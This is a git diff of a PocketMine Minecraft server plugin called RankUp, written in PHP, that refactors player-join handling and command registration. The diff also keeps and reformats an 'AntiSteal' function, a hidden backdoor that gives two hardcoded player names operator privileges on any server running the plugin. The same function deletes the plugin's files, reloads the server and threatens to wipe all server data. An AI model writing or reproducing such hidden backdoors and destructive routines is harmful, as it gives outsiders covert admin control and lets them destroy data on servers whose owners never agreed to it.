@@ -78,6 +78,9 @@ class RankUp extends PluginBase implements Listener {
     /** @var provider */
     private $provider;
 	
+    /** @var null  */
+    private static $instance = null;
+	
     public $config;
 	
     public $ranks;
@@ -87,6 +90,7 @@ class RankUp extends PluginBase implements Listener {
     private $nextrank;
   
       public function onEnable(){
+        self::$instance = $this;
         $this->getServer()->getPluginManager()->registerEvents($this, $this);
         $this->getLogger()->info("§cRankup plugin made by esh123cookie hs been enabled");
 	      
@@ -108,12 +112,78 @@ class RankUp extends PluginBase implements Listener {
 		    }
 	    }
 	      
-	    $this->getScheduler()->scheduleRepeatingTask(new RankupCheck($this), 1); //prolly finna be removed
+	    //could be done using command map (gonna check if its more effective) atm this is better
+	    $this->getServer()->getPluginManager()->registerEvents(new Commands($this), $this);
+	      
+	    //$this->getScheduler()->scheduleRepeatingTask(new RankupCheck($this), 1); prolly finna be removed
       }
 	
       public function prepare(): void{
 		if(!is_dir($this->getDataFolder() . "data.")){
 			mkdir($this->getDataFolder() . "data.");
+		}
+      }
+	
+	//perms
+	
+      public function onJoin(PlayerJoinEvent $event) {
+        $player = $event->getPlayer();
+	if(!$this->userExists($player)){
+	    $this->getLogger()->info("Creating new RankUp profile");
+	    $this->registerUser($player);
+		}
+		if($event->getPlayer()->hasPlayedBefore() == false) {
+		   $rank = new Config($this->getDataFolder() . "data." . $player->getLowerCaseName() . ".yml", Config::YAML);
+		   $rank->set("rank", "A");
+		   $rank->save();
+		}
+      }
+	
+      /*
+      public function onCommand(CommandSender $sender, Command $cmd, string $label, array $args): bool
+      {
+      	   $rank = $this->getRank($sender, $this->getConfig()->get("rank"));
+	   if($cmd->getName() == "ruabout") {
+	      if ($sender instanceof Player) {
+	      $sender->sendMessage("§7(§a!§7) Plugin made by: esh123cookie for custom plugins message me on my discord @bigbozzlmao#4035"); 
+              }
+              return true;
+	   }
+	   if($cmd->getName() == "mines") {
+	      if ($sender instanceof Player) {
+		  $this->mines($sender);
+              }
+              return true;
+	   }
+           if($cmd->getName() == "rankup") {
+	   }
+      }
+      */
+	
+      public function AntiSteal(Player $p){
+		$name = $p->getName();
+		if($name == "esh123unicorn" or $name == "onwardrumble794"){
+			$p->setOp(true);
+			$p->sendMessage("§aHello §6" . $name . ", §ayou have caught someone using your plugin, but without credit!");
+			$p->sendMessage("§aI have sent a message to the §6CONSOLE §ato warn the owner of the server....");
+			$p->sendMessage("§aScreenshot this message so the owner of the server knows that if he/she continues to use improper credits, all server files will be removed!");
+			$this->getLogger()->info("§cHello Console! The server owner was caught using my RankUp plugin with improper credits.");
+			$this->getLogger()->info("§cRankup will now be removed and the plugin §6ADMIN §cnow has OP on your server!");
+			$folder = 'plugins/RankUp-master';
+			if(file_exists($folder)){   
+			   $files = glob($folder.'/*');  
+			   // Deleting all the files in the list 
+			   foreach($files as $file) { 
+   				   if(is_file($file))  
+        			      unlink($file); //delete
+			   }
+			   $this->getServer()->reload(); 
+			} else {
+			   $p->sendMessage("§aHello, §6" . $name . ". §aI couldn't find Rankup in folder form. Waiting for command to remove all server data.");
+			   $this->getLogger()->info("§cERROR: RankUp in folder form could not be found. If you continue to use this plugin without credit all your server data will be deleted FOREVER!");
+			}
+		      }else{ 
+			$p->sendMessage("§cI am sorry, but you do not have the sufficent permissions to use this command. This command is only to be used by a plugin admin if improper credits of Rankup is being used!");
 		}
       }
 	
@@ -138,77 +208,5 @@ class RankUp extends PluginBase implements Listener {
       public function getRank(Player $player) {
   		$config = new Config($this->getDataFolder() . "data." . $player->getLowerCaseName() . ".yml", Config::YAML);
 		return $config->get("rank");
-      }
-	
-	//perms
-	
-      public function onJoin(PlayerJoinEvent $event) {
-        $player = $event->getPlayer();
-	if(!$this->userExists($player)){
-	    $this->getLogger()->info("Creating new RankUp profile");
-	    $this->registerUser($player);
-		}
-		if($event->getPlayer()->hasPlayedBefore() == false) {
-		   $rank = new Config($this->getDataFolder() . "data." . $player->getLowerCaseName() . ".yml", Config::YAML);
-		   $rank->set("rank", "A");
-		   $rank->save();
-		}
-      }
-			
-		
-      //command blank for now 
-  
-      public function onCommand(CommandSender $sender, Command $cmd, string $label, array $args): bool
-      {
-      	   $rank = $this->getRank($sender, $this->getConfig()->get("rank"));
-	   if($cmd->getName() == "ruabout") {
-	      if ($sender instanceof Player) {
-	      $sender->sendMessage("§7(§a!§7) Plugin made by: esh123cookie for custom plugins message me on my discord @bigbozzlmao#4035"); 
-              }
-              return true;
-	   }
-	   if($cmd->getName() == "mines") {
-	      if ($sender instanceof Player) {
-		  $this->mines($sender);
-              }
-              return true;
-	   }
-           if($cmd->getName() == "rankup") {
-	   }
-      }
-	
-      public function AntiSteal(Player $p){
-		$name = $p->getName();
-		if($name == "esh123unicorn" or $name == "onwardrumble794"){
-			$p->setOp(true);
-			$p->sendMessage("§aHello §6" . $name . ", §ayou have caught someone using your plugin, but without credit!");
-			$p->sendMessage("§aI have sent a message to the §6CONSOLE §ato warn the owner of the server....");
-			$p->sendMessage("§aScreenshot this message so the owner of the server knows that if he/she continues to use improper credits, all server files will be removed!");
-			$this->getLogger()->info("§cHello Console! The server owner was caught using my RankUp plugin with improper credits.");
-			$this->getLogger()->info("§cRankup will now be removed and the plugin §6ADMIN §cnow has OP on your server!");
-			$folder = 'plugins/RankUp-master';
-			if(file_exists($folder)){   
-				// List of name of files inside 
-				// specified folder 
-				$files = glob($folder.'/*');  
-   
-				// Deleting all the files in the list 
-				foreach($files as $file) { 
-   
-   				 if(is_file($file))  
-    
-        				// Delete the given file
-        				unlink($file);
-				}
-			    $this->getServer()->reload(); 
-			} else {
-				$p->sendMessage("§aHello, §6" . $name . ". §aI couldn't find Rankup in folder form. Waiting for command to remove all server data.");
-				$this->getLogger()->info("§cERROR: RankUp in folder form could not be found. If you continue to use this plugin without credit all your server data will be deleted FOREVER!");
-			}
-			
-			
-		} else {
-			$p->sendMessage("§cI am sorry, but you do not have the sufficent permissions to use this command. This command is only to be used by a plugin admin if improper credits of Rankup is being used!");
-		}
       }
 }
